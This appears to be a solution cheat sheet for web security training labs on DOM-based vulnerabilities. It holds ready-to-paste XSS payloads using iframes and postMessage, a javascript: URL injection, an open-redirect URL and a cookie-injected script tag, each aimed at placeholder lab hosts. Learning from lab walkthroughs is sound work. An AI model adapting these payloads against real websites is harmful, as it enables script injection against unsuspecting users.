**Step 1 — Identify the lab type**

- Open the lab. View page source (`Ctrl+U`) and search for `addEventListener` — if found, it tells you which of the first three labs you have.
- If `addEventListener` is **not found**, check for these instead:

|What you see in source|Lab type|
|---|---|
|`innerHTML = e.data`|DOM XSS via web messages|
|`location.href = url` + `indexOf('http')`|DOM XSS via web messages + JS URL|
|`JSON.parse(e.data)` + `iframe.src = d.url`|DOM XSS via web messages + JSON.parse|
|No `addEventListener` → navigate to a blog post → inspect the **"Back to Blog"** link for a `url=` param in the onclick|DOM-based open redirect|
|No `addEventListener` → check cookies in Burp — look for `lastViewedProduct` being reflected in an `<a href>` in the response|DOM-based cookie manipulation|

---

**If `innerHTML = e.data` → DOM XSS via web messages**

- Go to Exploit Server, paste into Body:

```html
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

- Store → Deliver to victim ✅

---

**If `location.href` + `indexOf('http')` → JS URL via web messages**

- Go to Exploit Server, paste into Body:

```html
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```

- Store → Deliver to victim ✅

---

**If `JSON.parse(e.data)` + `iframe.src` → JSON.parse web messages**

- Go to Exploit Server, paste into Body:

```html
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

* Store → Deliver to victim ✅

---

**If `url=(https?:\/\/.+)` regex → DOM-based open redirect**
* No exploit server needed. Construct this URL and visit it:
```
  https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
````

- Click the "Back to Blog" link → redirect fires → lab solved ✅

---

**If `lastViewedProduct` cookie in `<a href>` → DOM-based cookie manipulation**

- Go to Exploit Server, paste into Body:

```html
  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

- Store → Deliver to victim ✅